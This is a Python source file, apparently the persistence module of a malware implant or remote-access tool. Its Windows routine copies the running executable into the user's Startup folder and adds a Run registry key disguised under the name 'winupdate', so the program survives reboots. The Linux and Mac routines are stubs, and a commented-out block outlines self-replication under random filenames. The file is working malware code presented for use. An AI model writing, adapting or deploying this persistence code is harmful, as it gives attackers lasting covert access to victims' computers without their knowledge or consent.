import sys, os, uuid
from shutil import copy2

def windows_persistence():
    import winreg
    from winreg import HKEY_CURRENT_USER as HKCU

    run_key = r'Software\Microsoft\Windows\CurrentVersion\Run'
    exe_path = sys.executable 
    try:
        ## Copy executable to startup directory
        appdata = os.getenv('APPDATA')
        alt_path = "{}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup".format(appdata)
        if(os.path.exists(alt_path)):
            # copy executable to this path
            print("Trying Implant")
            try:
                print("EXE PATH {}".format(exe_path))
                print("ALT PATH {}".format(alt_path))
                copy2(exe_path, alt_path)
                print("Implant successful")
            except Exception as exc:
                print("Implant uncessful")

        ## Create Reg Key
        reg_key = winreg.OpenKey(HKCU, run_key, 0, winreg.KEY_WRITE)
        winreg.SetValueEx(reg_key, 'winupdate', 0, winreg.REG_SZ, exe_path)
        return True, 'HKCU reg key created'
    except WindowsError:
        return False, 'HKCU reg key failed!'

def linux_persistence():
    return False, 'Coming Soon!'

        ## This code is to self replicate by copying contents of file into another file
        #old_path = os.getcwd()
        #os.chdir(alt_path)
        #self_content = file(sys.argv[0]).read()
        ## Generate a randome filename
        #dupe = "{}.py".format(uuid.uuid4())
        ## Open and write content to file
        #copy = open(dupe, "w")
        #copy.write(self_content)
        #copy.close

        # Make copy Executable.
        #os.chmod(dupe, 0o775)

def mac_persistence():
    return False, 'Coming Soon!'

def run(plat):
    if(plat == "Windows"):
        success, details = windows_persistence()
    elif(plat == "Linux"):
        success, details = linux_persistence()
    elif(plat == "Macintosh"):
        success, details = mac_persistence()
    
    if success:
        results = 'Implant Successful, {}'.format(details)
    else:
        results = 'Implant Un-Successful, {}'.format(details)

    return results